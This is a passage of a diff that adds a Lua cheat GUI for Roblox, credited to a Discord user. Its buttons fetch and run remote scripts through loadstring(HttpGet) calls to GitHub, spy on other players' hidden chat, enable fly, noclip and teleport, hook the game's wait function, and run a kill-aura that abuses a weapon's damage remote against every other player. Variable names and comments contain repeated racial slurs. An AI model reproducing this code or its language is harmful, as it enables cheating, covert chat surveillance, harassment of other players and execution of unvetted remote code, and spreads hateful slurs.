+nigga2()
+nigga1()
+
+end)
+
+Infinite.Name = "Infinite"
+Infinite.Parent = gamingframe
+Infinite.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+Infinite.BorderColor3 = Color3.fromRGB(145, 145, 145)
+Infinite.BorderSizePixel = 0
+Infinite.Position = UDim2.new(0.703157902, 0, 0.0693705902, 0)
+Infinite.Size = UDim2.new(0, 129, 0, 50)
+Infinite.Font = Enum.Font.Gotham
+Infinite.Text = "Infinite Yield"
+Infinite.TextColor3 = Color3.fromRGB(0, 0, 0)
+Infinite.TextSize = 15.000
+Infinite.TextWrapped = true
+Infinite.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
+end)
+
+chattroll.Name = "chattroll"
+chattroll.Parent = gamingframe
+chattroll.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+chattroll.BorderColor3 = Color3.fromRGB(145, 145, 145)
+chattroll.BorderSizePixel = 0
+chattroll.Position = UDim2.new(0.364210516, 0, 0.0693705902, 0)
+chattroll.Size = UDim2.new(0, 129, 0, 50)
+chattroll.Font = Enum.Font.Gotham
+chattroll.Text = "Chat Troll Gui"
+chattroll.TextColor3 = Color3.fromRGB(0, 0, 0)
+chattroll.TextSize = 15.000
+chattroll.TextWrapped = true
+chattroll.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/cooldawg123/chattroll/refs/heads/main/v2.lua",true))() 
+end)
+
+cspy.Name = "cspy"
+cspy.Parent = gamingframe
+cspy.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+cspy.BorderColor3 = Color3.fromRGB(145, 145, 145)
+cspy.BorderSizePixel = 0
+cspy.Position = UDim2.new(0.0252631586, 0, 0.0693705902, 0)
+cspy.Size = UDim2.new(0, 129, 0, 50)
+cspy.Font = Enum.Font.Gotham
+cspy.Text = "Chat Spy"
+cspy.TextColor3 = Color3.fromRGB(0, 0, 0)
+cspy.TextSize = 15.000
+cspy.TextWrapped = true
+cspy.MouseButton1Down:Connect(function()
+
+	-- Config
+	Config = {
+		enabled = true,
+		spyOnMyself = true,
+		public = false,
+		publicItalics = true
+	}
+
+	-- Customizing Log Output
+	PrivateProperties = {
+		Color = Color3.fromRGB(0,255,255); 
+		Font = Enum.Font.SourceSansBold;
+		TextSize = 18;
+	}
+
+	local StarterGui = game:GetService("StarterGui")
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+	local instance = (_G.chatSpyInstance or 0) + 1
+	_G.chatSpyInstance = instance
+
+	local function onChatted(p,msg)
+		if _G.chatSpyInstance == instance then
+			if p==player and msg:lower():sub(1,4)=="/spy" then
+				Config.enabled = not Config.enabled
+				wait(0.3)
+				PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
+				StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
+			elseif Config.enabled and (Config.spyOnMyself==true or p~=player) then
+				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+				local hidden = true
+				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and Config.public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+						hidden = false
+					end
+				end)
+				wait(1)
+				conn:Disconnect()
+				if hidden and Config.enabled then
+					if Config.public then
+						saymsg:FireServer((Config.publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
+					else
+						PrivateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+						StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
+					end
+				end
+			end
+		end
+	end
+
+	for _,p in ipairs(Players:GetPlayers()) do
+		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+	end
+
+	Players.PlayerAdded:Connect(function(p)
+		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+	end)
+
+	PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
+	StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
+	local chatFrame = player.PlayerGui.Chat.Frame
+	chatFrame.ChatChannelParentFrame.Visible = true
+	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+end)
+
+lpframe.Name = "lpframe"
+lpframe.Parent = Frame
+lpframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+lpframe.BackgroundTransparency = 1.000
+lpframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+lpframe.BorderSizePixel = 0
+lpframe.Position = UDim2.new(-0.0266075395, 0, 0.181083947, 0)
+lpframe.Size = UDim2.new(0, 475, 0, 251)
+lpframe.Visible = false
+
+wsr.Name = "wsr"
+wsr.Parent = lpframe
+wsr.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+wsr.BorderColor3 = Color3.fromRGB(145, 145, 145)
+wsr.BorderSizePixel = 0
+wsr.Position = UDim2.new(0.0652631596, 0, 0.0760220811, 0)
+wsr.Size = UDim2.new(0, 412, 0, 52)
+wsr.Font = Enum.Font.Gotham
+wsr.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+wsr.PlaceholderText = "Walkspeed 16-1000"
+wsr.Text = ""
+wsr.TextColor3 = Color3.fromRGB(0, 0, 0)
+wsr.TextScaled = true
+wsr.TextSize = 10.000
+wsr.TextWrapped = true
+
+fly.Name = "fly (PC)"
+fly.Parent = lpframe
+fly.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+fly.BorderColor3 = Color3.fromRGB(145, 145, 145)
+fly.BorderSizePixel = 0
+fly.Position = UDim2.new(0.0670975521, 0, 0.374046177, 0)
+fly.Size = UDim2.new(0, 108, 0, 52)
+fly.Font = Enum.Font.Gotham
+fly.Text = "Fly"
+fly.TextColor3 = Color3.fromRGB(0, 0, 0)
+fly.TextSize = 29.000
+fly.TextWrapped = true
+fly.MouseButton1Down:Connect(function()
+
+
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+
+
+	repeat wait() until LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Torso") and LocalPlayer.Character:FindFirstChild("Humanoid")
+
+	local mouse = LocalPlayer:GetMouse()
+	local torso = LocalPlayer.Character.Torso
+	local flying = true
+	local ctrl = {f = 0, b = 0, l = 0, r = 0}
+	local maxspeed = 50
+	local speed = 0
+
+
+	local function Fly()
+		local bg = Instance.new("BodyGyro", torso)
+		bg.P = 9e4
+		bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+		bg.CFrame = torso.CFrame
+		local bv = Instance.new("BodyVelocity", torso)
+		bv.Velocity = Vector3.new(0, 0.1, 0)
+		bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+
+		repeat wait()
+			LocalPlayer.Character.Humanoid.PlatformStand = true
+
+			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
+				speed = speed + .5 + (speed / maxspeed)
+				if speed > maxspeed then speed = maxspeed end
+			else
+				speed = speed - 1
+				if speed < 0 then speed = 0 end
+			end
+
+			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
+				bv.Velocity = ((workspace.CurrentCamera.CFrame.LookVector * (ctrl.f + ctrl.b)) + ((workspace.CurrentCamera.CFrame * CFrame.new(ctrl.l + ctrl.r, (ctrl.f + ctrl.b) * .2, 0).p) - workspace.CurrentCamera.CFrame.p)) * speed
+			else
+				bv.Velocity = Vector3.new(0, 0.1, 0)
+			end
+
+			bg.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(-math.rad((ctrl.f + ctrl.b) * 50 * speed / maxspeed), 0, 0)
+		until not flying
+
+		ctrl = {f = 0, b = 0, l = 0, r = 0}
+		speed = 0
+		bg:Destroy()
+		bv:Destroy()
+		LocalPlayer.Character.Humanoid.PlatformStand = false
+	end
+
+
+	mouse.KeyDown:connect(function(key)
+		if key:lower() == "w" then
+			ctrl.f = 1
+		elseif key:lower() == "s" then
+			ctrl.b = -1
+		elseif key:lower() == "a" then
+			ctrl.l = -1
+		elseif key:lower() == "d" then
+			ctrl.r = 1
+		end
+	end)
+
+	mouse.KeyUp:connect(function(key)
+		if key:lower() == "w" then
+			ctrl.f = 0
+		elseif key:lower() == "s" then
+			ctrl.b = 0
+		elseif key:lower() == "a" then
+			ctrl.l = 0
+		elseif key:lower() == "d" then
+			ctrl.r = 0
+		end
+	end)
+
+	Fly()  
+
+end)
+
+infjump.Name = "infjump"
+infjump.Parent = lpframe
+infjump.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+infjump.BorderColor3 = Color3.fromRGB(145, 145, 145)
+infjump.BorderSizePixel = 0
+infjump.Position = UDim2.new(0.384992301, 0, 0.366078049, 0)
+infjump.Size = UDim2.new(0, 108, 0, 52)
+infjump.Font = Enum.Font.Gotham
+infjump.Text = "Infinite Jump"
+infjump.TextColor3 = Color3.fromRGB(0, 0, 0)
+infjump.TextScaled = true
+infjump.TextSize = 1.000
+infjump.TextWrapped = true
+infjump.MouseButton1Down:Connect(function()
+	local Player = game.Players.LocalPlayer
+	local UserInputService = game:GetService("UserInputService")
+
+	local jumpConnection
+
+
+	local function enableJump()
+		jumpConnection = UserInputService.JumpRequest:Connect(function()
+			if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
+				Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end)
+	end
+
+
+	enableJump()
+
+	
+	Player.CharacterAdded:Connect(function()
+		if jumpConnection then
+			jumpConnection:Disconnect()
+		end
+	end)
+
+end)
+
+noclip.Name = "noclip"
+noclip.Parent = lpframe
+noclip.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+noclip.BorderColor3 = Color3.fromRGB(145, 145, 145)
+noclip.BorderSizePixel = 0
+noclip.Position = UDim2.new(0.70709753, 0, 0.366078049, 0)
+noclip.Size = UDim2.new(0, 108, 0, 52)
+noclip.Font = Enum.Font.Gotham
+noclip.Text = "Noclip"
+noclip.TextColor3 = Color3.fromRGB(0, 0, 0)
+noclip.TextScaled = true
+noclip.TextSize = 1.000
+noclip.TextWrapped = true
+noclip.MouseButton1Down:Connect(function()
+	local player = game.Players.LocalPlayer
+	local character = player.Character or player.CharacterAdded:Wait()
+	local noclipConnection
+	
+	local function enableNoclip()
+		noclipConnection = game:GetService("RunService").Stepped:Connect(function()
+			for _, part in pairs(character:GetChildren()) do
+				if part:IsA("BasePart") then
+					part.CanCollide = false
+				end
+			end
+		end)
+	end
+	
+	enableNoclip()
+	
+	player.CharacterAdded:Connect(function()
+		if noclipConnection then
+			noclipConnection:Disconnect()
+		end
+		character = player.Character
+	end)
+	
+
+end)
+
+antiafk.Name = "antiafk"
+antiafk.Parent = lpframe
+antiafk.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+antiafk.BorderColor3 = Color3.fromRGB(145, 145, 145)
+antiafk.BorderSizePixel = 0
+antiafk.Position = UDim2.new(0.0670975521, 0, 0.688787222, 0)
+antiafk.Size = UDim2.new(0, 108, 0, 52)
+antiafk.Font = Enum.Font.Gotham
+antiafk.Text = "Anti Afk"
+antiafk.TextColor3 = Color3.fromRGB(0, 0, 0)
+antiafk.TextSize = 29.000
+antiafk.TextWrapped = true
+antiafk.MouseButton1Down:Connect(function()
+	local bb = game:GetService("VirtualUser")
+
+	game:GetService("Players").LocalPlayer.Idled:Connect(function()
+		bb:CaptureController()
+		bb:ClickButton2(Vector2.new())
+	end)
+
+end)
+
+infjump_2.Name = "infjump"
+infjump_2.Parent = lpframe
+infjump_2.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+infjump_2.BorderColor3 = Color3.fromRGB(145, 145, 145)
+infjump_2.BorderSizePixel = 0
+infjump_2.Position = UDim2.new(0.384992301, 0, 0.688787222, 0)
+infjump_2.Size = UDim2.new(0, 108, 0, 52)
+infjump_2.Font = Enum.Font.Gotham
+infjump_2.Text = "Click Tp"
+infjump_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+infjump_2.TextScaled = true
+infjump_2.TextSize = 1.000
+infjump_2.TextWrapped = true
+infjump_2.MouseButton1Down:Connect(function()
+	local Players = game:GetService("Players")
+	local Tool = Instance.new("Tool")
+	local LocalPlayer = Players.LocalPlayer
+
+	Tool.Name = "Click 2 TP"
+	Tool.RequiresHandle = false
+	Tool.Parent = LocalPlayer.Backpack
+
+	Tool.Activated:Connect(function()
+		local mouse = LocalPlayer:GetMouse()
+		local targetPosition = mouse.Hit.p
+		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+			LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
+		end
+	end)
+
+end)
+
+dashinf.Name = "dashinf"
+dashinf.Parent = lpframe
+dashinf.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+dashinf.BorderColor3 = Color3.fromRGB(145, 145, 145)
+dashinf.BorderSizePixel = 0
+dashinf.Position = UDim2.new(0.70709753, 0, 0.688787222, 0)
+dashinf.Size = UDim2.new(0, 108, 0, 52)
+dashinf.Font = Enum.Font.Gotham
+dashinf.Text = "Infinite Dash"
+dashinf.TextColor3 = Color3.fromRGB(0, 0, 0)
+dashinf.TextScaled = true
+dashinf.TextSize = 1.000
+dashinf.TextWrapped = true
+dashinf.MouseButton1Down:Connect(function()
+	originalfunction = hookfunction(wait, function(seconds)
+		if seconds == 2 then return end
+		return originalfunction(seconds)
+	end)
+end)
+
+closexd.Name = "closexd"
+closexd.Parent = Frame
+closexd.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+closexd.BorderColor3 = Color3.fromRGB(145, 145, 145)
+closexd.BorderSizePixel = 0
+closexd.Position = UDim2.new(0.911308229, 0, -0.0442804433, 0)
+closexd.Size = UDim2.new(0, 52, 0, 33)
+closexd.Font = Enum.Font.Gotham
+closexd.Text = "X"
+closexd.TextColor3 = Color3.fromRGB(0, 0, 0)
+closexd.TextSize = 29.000
+closexd.TextWrapped = true
+
+UICorner_6.Parent = closexd
+
+killframe.Name = "killframe"
+killframe.Parent = Frame
+killframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+killframe.BackgroundTransparency = 1.000
+killframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+killframe.BorderSizePixel = 0
+killframe.Position = UDim2.new(-0.0266075395, 0, 0.181083947, 0)
+killframe.Size = UDim2.new(0, 475, 0, 251)
+
+users.Name = "users"
+users.Parent = killframe
+users.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+users.BorderColor3 = Color3.fromRGB(145, 145, 145)
+users.BorderSizePixel = 0
+users.Position = UDim2.new(0.107368425, 0, 0.0600858368, 0)
+users.Size = UDim2.new(0, 372, 0, 52)
+users.Font = Enum.Font.Gotham
+users.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+users.PlaceholderText = "Put target here, btw to select multiple targets, separate the users with commas and DONT use spaces or it will break it"
+users.Text = ""
+users.TextColor3 = Color3.fromRGB(0, 0, 0)
+users.TextScaled = true
+users.TextSize = 10.000
+users.TextWrapped = true
+
+killon.Name = "killon"
+killon.Parent = killframe
+killon.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+killon.BorderColor3 = Color3.fromRGB(145, 145, 145)
+killon.BorderSizePixel = 0
+killon.Position = UDim2.new(0.107368425, 0, 0.41200006, 0)
+killon.Size = UDim2.new(0, 162, 0, 50)
+killon.Font = Enum.Font.Gotham
+killon.Text = "Loopkill Off"
+killon.TextColor3 = Color3.fromRGB(0, 0, 0)
+killon.TextSize = 31.000
+
+clear.Name = "clear"
+clear.Parent = killframe
+clear.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+clear.BorderColor3 = Color3.fromRGB(145, 145, 145)
+clear.BorderSizePixel = 0
+clear.Position = UDim2.new(0.549473703, 0, 0.41200006, 0)
+clear.Size = UDim2.new(0, 162, 0, 50)
+clear.Font = Enum.Font.Gotham
+clear.Text = "Clear Targets"
+clear.TextColor3 = Color3.fromRGB(0, 0, 0)
+clear.TextSize = 28.000
+
+aura.Name = "aura"
+aura.Parent = killframe
+aura.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+aura.BorderColor3 = Color3.fromRGB(145, 145, 145)
+aura.BorderSizePixel = 0
+aura.Position = UDim2.new(0.178947374, 0, 0.754424334, 0)
+aura.Size = UDim2.new(0, 304, 0, 44)
+aura.Font = Enum.Font.Gotham
+aura.Text = "Kill All (Kinda slow)"
+aura.TextColor3 = Color3.fromRGB(0, 0, 0)
+aura.TextSize = 33.000
+
+--kill aura nigger shot oh mee godsdklfsdjlkfjs
+shared.settings = {
+	killaura = false,
+	targets = {}, 
+}
+
+local function getchar(plr, yield)
+	local plr = plr or lp
+	return plr.Character or yield and plr.CharacterAdded:Wait()
+end
+
+local function gethumanoid(plr, yield)
+	local char = getchar(plr, yield)
+	return yield and char:WaitForChild("Humanoid") or char:FindFirstChildWhichIsA("Humanoid")
+end
+
+local function getDamageRemote()
+	local char = getchar(nil, true)
+	local Tool = char:FindFirstChild("Pencil")
+	return Tool and Tool:FindFirstChild("DamageRemote")
+end
+
+local function fucktargets()
+	local targets = {}
+	for _, v in ipairs(Players:GetPlayers()) do
+		if v ~= lp then
+			local char = getchar(v)
+			if char and not char:FindFirstChildWhichIsA("ForceField") then
+				local Humanoid = gethumanoid(v)
+				if Humanoid and Humanoid.Health > 0 then
+					table.insert(targets, v)  
+				end
+			end
+		end
+	end
+	return targets
+end
+
+local function KillAuraLoop()
+	if not shared.settings.killaura then return end 
+
+	local DamageRemote = getDamageRemote()
+	if DamageRemote then
+		local targets = fucktargets()
+		if #targets > 0 then
+			for _, target in ipairs(targets) do
+				for i = 1, 5 do
+					if not shared.settings.killaura then return end 
+
+					local character = lp.Character
+					if character and character:FindFirstChild("HumanoidRootPart") then
+						local targetHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+						if targetHRP then
+							character:MoveTo(targetHRP.Position - (targetHRP.CFrame.LookVector * 1))
+							DamageRemote:FireServer(gethumanoid(target))
+						end
+					end
+					wait(1)
+				end
+			end
+		end
+	else
+		local Tool = lp.Character:FindFirstChild("Pencil")
+		if not Tool and not shared.toolNotified then
+		
+
+			shared.toolNotified = true  
+			StopKillAura()  
+			shared.settings.killaura = false  
+			aura.Text = "Toggle KillAura"  
+		end
+	end
+end
+
+local function onCharacterAdded(character)
+	local humanoid = character:WaitForChild("Humanoid")
+	humanoid.Died:Connect(function()
+		if shared.settings.killaura then
+			local toolListener
+			toolListener = character.ChildAdded:Connect(function(child)
+				if child.Name == "Pencil" then
+					shared.settings.killaura = true
+					KillAuraLoop()
+					toolListener:Disconnect()
+				end
+			end)
+		end
+	end)
+end
+
+lp.CharacterAdded:Connect(onCharacterAdded)
+
+if lp.Character then
+	onCharacterAdded(lp.Character)
+end
+
+
+local function StartKillAura()
+	if not shared.activeScript then  
+		shared.activeScript = RunService.Heartbeat:Connect(KillAuraLoop)
+		shared.toolNotified = false  
+	end
+end
+
+local function StopKillAura()
+	if shared.activeScript then
+		shared.activeScript:Disconnect()
+		shared.activeScript = nil
+		shared.settings.targets = {}  
+		shared.toolNotified = false 
+	end
+end
+
+aura.MouseButton1Click:Connect(function()
+	shared.settings.killaura = not shared.settings.killaura
+	aura.Text = shared.settings.killaura and "Kill All On" or "Kill All Off"
+
+	if shared.settings.killaura then
+
+		shared.settings.targets = fucktargets()
+		StartKillAura()  
+	else
+		StopKillAura()  
+	end
+end)
+
+lp.CharacterAdded:Connect(function()
+	if shared.settings.killaura then
+		StartKillAura()
+	end
+end)
+
+if shared.settings.killaura then
+	StartKillAura()
+end
+
+
+
+killborder.Name = "killborder"
+killborder.Parent = killframe
+killborder.BackgroundColor3 = Color3.fromRGB(145, 145, 145)
+killborder.BorderColor3 = Color3.fromRGB(0, 0, 0)
+killborder.BorderSizePixel = 0
+killborder.Position = UDim2.new(0, 0, 0.716129005, 0)
+killborder.Size = UDim2.new(0, 475, 0, 1)
+
+settingsframe.Name = "settingsframe"
+settingsframe.Parent = Frame
+settingsframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+settingsframe.BackgroundTransparency = 1.000
+settingsframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+settingsframe.BorderSizePixel = 0
+settingsframe.Position = UDim2.new(-0.0266075395, 0, 0.181083947, 0)
+settingsframe.Size = UDim2.new(0, 475, 0, 251)
+settingsframe.Visible = false
+
+rjfr.Name = "rjfr"
+rjfr.Parent = settingsframe
+rjfr.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+rjfr.BorderColor3 = Color3.fromRGB(145, 145, 145)
+rjfr.BorderSizePixel = 0
+rjfr.Position = UDim2.new(0.0547368415, 0, 0.368175358, 0)
+rjfr.Size = UDim2.new(0, 422, 0, 50)
+rjfr.Font = Enum.Font.Gotham
+rjfr.Text = "Anti-Report"
+rjfr.TextColor3 = Color3.fromRGB(0, 0, 0)
+rjfr.TextSize = 31.000
+rjfr.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()
+end)
+
+dgui.Name = "dgui"
+dgui.Parent = settingsframe
+dgui.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+dgui.BorderColor3 = Color3.fromRGB(145, 145, 145)
+dgui.BorderSizePixel = 0
+dgui.Position = UDim2.new(0.0547368415, 0, 0.073354654, 0)
+dgui.Size = UDim2.new(0, 422, 0, 50)
+dgui.Font = Enum.Font.Gotham
+dgui.Text = "Destroy Gui"
+dgui.TextColor3 = Color3.fromRGB(0, 0, 0)
+dgui.TextSize = 28.000
+dgui.MouseButton1Down:Connect(function()
+	Frame.Visible = false
+	openxd.Visible = false
+	_G.scriptrunning = false
+end)
+
+shfr.Name = "shfr"
+shfr.Parent = settingsframe
+shfr.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+shfr.BorderColor3 = Color3.fromRGB(145, 145, 145)
+shfr.BorderSizePixel = 0
+shfr.Position = UDim2.new(0.0547368415, 0, 0.682916403, 0)
+shfr.Size = UDim2.new(0, 422, 0, 50)
+shfr.Font = Enum.Font.Gotham
+shfr.Text = "Rejoin"
+shfr.TextColor3 = Color3.fromRGB(0, 0, 0)
+shfr.TextSize = 31.000
+shfr.MouseButton1Down:Connect(function()
+	local tp = game:GetService("TeleportService")
+local plr = game:GetService("Players").LocalPlayer
+tp:TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
+
+
+end)
+
+creditsframe.Name = "creditsframe"
+creditsframe.Parent = Frame
+creditsframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+creditsframe.BackgroundTransparency = 1.000
+creditsframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+creditsframe.BorderSizePixel = 0
+creditsframe.Position = UDim2.new(-0.0266075395, 0, 0.181083947, 0)
+creditsframe.Size = UDim2.new(0, 475, 0, 251)
+creditsframe.Visible = false
+
+creds1.Name = "creds1"
+creds1.Parent = creditsframe
+creds1.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+creds1.BorderColor3 = Color3.fromRGB(145, 145, 145)
+creds1.BorderSizePixel = 0
+creds1.Position = UDim2.new(0.0252631586, 0, 0.0557768941, 0)
+creds1.Size = UDim2.new(0, 451, 0, 57)
+creds1.Font = Enum.Font.Gotham
+creds1.Text = "Script Made By rurur123 on discord"
+creds1.TextColor3 = Color3.fromRGB(0, 0, 0)
+creds1.TextSize = 16.000
+creds1.TextWrapped = true
+
+creds2.Name = "creds2"
+creds2.Parent = creditsframe
+creds2.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+creds2.BorderColor3 = Color3.fromRGB(145, 145, 145)
+creds2.BorderSizePixel = 0
+creds2.Position = UDim2.new(0.0252631586, 0, 0.326693237, 0)
+creds2.Size = UDim2.new(0, 451, 0, 57)
+creds2.Font = Enum.Font.Gotham
+creds2.Text = "Click me for all of my socials!"
+creds2.TextColor3 = Color3.fromRGB(0, 0, 0)
+creds2.TextSize = 18.000
+creds2.TextWrapped = true
+creds2.MouseButton1Down:Connect(function()
+	local sdlkd = "Roblox: ii_dino122/TLK_metamethod, Discord: rurur123, Avatar: I have flaming hair and wear a legend shirt"
+	setclipboard(sdlkd)
+	wait(0.1)
+	local asd3 = Instance.new("ScreenGui")
+	local framidy2 = Instance.new("Frame")
+	local titleskib1 = Instance.new("TextLabel")
+	local niggerrrrrr1 = Instance.new("TextButton")
+
+	--Properties:
+
+	asd3.Name = "asd3"
+	asd3.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	asd3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	asd3.ResetOnSpawn = false
+
+	framidy2.Name = "framidy2"
+	framidy2.Parent = asd3
+	framidy2.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+	framidy2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	framidy2.BorderSizePixel = 0
+	framidy2.Position = UDim2.new(0.551932395, 0, 0.539428592, 0)
+	framidy2.Size = UDim2.new(0, 260, 0, 91)
+	framidy2.Active = true
+	framidy2.Draggable = true
+
+	titleskib1.Name = "titleskib1"
+	titleskib1.Parent = framidy2
+	titleskib1.BackgroundColor3 = Color3.fromRGB(145, 145, 145)
+	titleskib1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	titleskib1.BorderSizePixel = 0
+	titleskib1.Position = UDim2.new(0.0350745581, 0, 0.101409577, 0)
+	titleskib1.Size = UDim2.new(0, 244, 0, 72)
+	titleskib1.Font = Enum.Font.Gotham
+	titleskib1.Text = "Roblox: ii_dino122/TLK_metamethod,Discord: rurur123,Avatar: I have flaming hair and wear a legend shirt"
+	titleskib1.TextColor3 = Color3.fromRGB(0, 0, 0)
+	titleskib1.TextScaled = true
+	titleskib1.TextSize = 14.000
+	titleskib1.TextWrapped = true
+
+	niggerrrrrr1.Name = "niggerrrrrr1"
+	niggerrrrrr1.Parent = framidy2
+	niggerrrrrr1.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+	niggerrrrrr1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	niggerrrrrr1.BorderSizePixel = 0
+	niggerrrrrr1.Position = UDim2.new(1, 0, -0.00148496521, 0)
+	niggerrrrrr1.Size = UDim2.new(0, 36, 0, 26)
+	niggerrrrrr1.Font = Enum.Font.SourceSans
+	niggerrrrrr1.Text = "X"
+	niggerrrrrr1.TextColor3 = Color3.fromRGB(0, 0, 0)
+	niggerrrrrr1.TextScaled = true
+	niggerrrrrr1.TextSize = 14.000
+	niggerrrrrr1.TextWrapped = true
+	niggerrrrrr1.MouseButton1Down:Connect(function()
+		framidy2.Visible = false
+	end)
+end)
+
+creds3.Name = "creds3"
+creds3.Parent = creditsframe
+creds3.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+creds3.BorderColor3 = Color3.fromRGB(145, 145, 145)
+creds3.BorderSizePixel = 0
+creds3.Position = UDim2.new(0.0252631586, 0, 0.601593614, 0)
+creds3.Size = UDim2.new(0, 451, 0, 57)
+creds3.Font = Enum.Font.Gotham
+creds3.Text = "Copy discord server link to stay up-to-date on new updates!"
+creds3.TextColor3 = Color3.fromRGB(0, 0, 0)
+creds3.TextSize = 18.000
+creds3.TextWrapped = true
+creds3.MouseButton1Down:Connect(function()
+	local discordnigger = "https://discord.gg/7Qz6p83MJV"
+	setclipboard(discordnigger)
+	wait(0.1)
+	local asd2 = Instance.new("ScreenGui")
+	local framidy1 = Instance.new("Frame")
+	local titleskib = Instance.new("TextLabel")
+	local titleskib1 = Instance.new("TextLabel")
+	local TextButton = Instance.new("TextButton")
+
+	--Properties:
+
+	asd2.Name = "asd2"
+	asd2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	asd2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	asd2.ResetOnSpawn = false
+
+	framidy1.Name = "framidy1"
+	framidy1.Parent = asd2
+	framidy1.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+	framidy1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	framidy1.BorderSizePixel = 0
+	framidy1.Position = UDim2.new(0.347222209, 0, 0.321142852, 0)
+	framidy1.Size = UDim2.new(0, 243, 0, 74)
+	framidy1.Active = true
+	framidy1.Draggable = true
+
+	titleskib.Name = "titleskib"
+	titleskib.Parent = framidy1
+	titleskib.BackgroundColor3 = Color3.fromRGB(145, 145, 145)
+	titleskib.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	titleskib.BorderSizePixel = 0
+	titleskib.Position = UDim2.new(0.0658436194, 0, 0.200310782, 0)
+	titleskib.Size = UDim2.new(0, 211, 0, 44)
+	titleskib.Font = Enum.Font.Gotham
+	titleskib.Text = "https://discord.gg/7Qz6p83MJV"
+	titleskib.TextColor3 = Color3.fromRGB(0, 0, 0)
+	titleskib.TextScaled = true
+	titleskib.TextSize = 14.000
+	titleskib.TextWrapped = true
+
+	titleskib1.Name = "titleskib1"
+	titleskib1.Parent = framidy1
+	titleskib1.BackgroundColor3 = Color3.fromRGB(145, 145, 145)
+	titleskib1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	titleskib1.BorderSizePixel = 0
